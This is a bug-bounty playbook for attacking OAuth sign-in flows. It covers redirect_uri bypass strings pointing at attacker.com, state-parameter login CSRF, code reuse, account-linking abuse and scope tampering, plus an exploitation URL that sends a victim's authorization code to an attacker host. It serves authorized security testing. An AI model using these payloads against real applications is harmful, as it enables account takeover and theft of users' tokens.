# OAuth attacks — playbook

## when to try
- "Sign in with Google/Facebook/GitHub/Microsoft/Apple", any custom SSO, any
  app exposing `/oauth/authorize`, `/oauth/callback`, `/connect/{provider}`.
- Whenever you see `client_id`, `redirect_uri`, `state`, `code`, `id_token`.

## bug archetypes (the bounty bread-and-butter)
1. **redirect_uri bypass**: the IdP allows whitelisted redirect URIs but the validation is loose:
   - Suffix check → `https://target.com.attacker.com`.
   - Prefix check → `https://target.com@attacker.com/`.
   - Path traversal in URI → `https://target.com/oauth/callback/../../redirect/attacker`.
   - Wildcard subdomain → register/take-over a sibling subdomain.
   - URL fragment trick → `https://target.com/cb#@attacker.com`.
   - Open redirect on target → use `redirect_uri=https://target.com/redirect?u=https://attacker.com`.
2. **State CSRF (no state param)**: attacker pastes a code → victim ends up logged into attacker's account → attacker captures attached payment method / saved data.
3. **Code reuse / no PKCE**: code can be redeemed twice or by a different client.
4. **Client secret in JS**: leaked → impersonate the client.
5. **Mix-up attack**: client trusts "iss" from the user (Honeycomb 2014) → log in as anyone.
6. **Account linking abuse**: link victim's email to attacker's social → log in as victim (see also `auth-bypass.md`).
7. **Implicit flow with stolen `access_token`**: token in URL fragment → leaked via referer or analytics.
8. **`scope` upgrade in flight**: change `scope=openid` to `scope=openid admin` on consent.
9. **Open redirect via OAuth `error_uri` / `state`**: rare but seen.

## confirmation flow
1. Map the full OAuth flow with Burp. Note `client_id`, `redirect_uri`, `state`, `response_type`, `scope`.
2. Try each redirect_uri bypass — change one character at a time. The `code` ending up at `attacker.com` confirms the bug.
3. Drop `state` param entirely → if flow completes, it wasn't enforced.
4. Login-CSRF: build PoC that auto-submits attacker's `code` to victim's browser. Verify victim logs into attacker's account.

## exploitation snippet
redirect_uri exfil:
```
https://idp/oauth/authorize?client_id=APP&redirect_uri=https%3A%2F%2Fattacker.com&response_type=code&scope=email
```
Then on `attacker.com/?code=...` → exchange code at the legit token endpoint if you have client creds, or simply get the URL leak.

State drop:
```
# Capture victim's flow start, drop &state= from authorize URL, see if callback still completes.
```

## caveats
- Most major IdPs (Google/Microsoft/Apple) lock down redirect_uri matching. Bugs live in the *client* app's whitelist, not the IdP.
- "Account-linking" requires demonstrating a victim flow. Build a clean PoC.

## provenance
PortSwigger OAuth labs. RFC 6749 + RFC 8252 + 9700 (Best Current Practice). Many HackerOne $5–$25k reports.
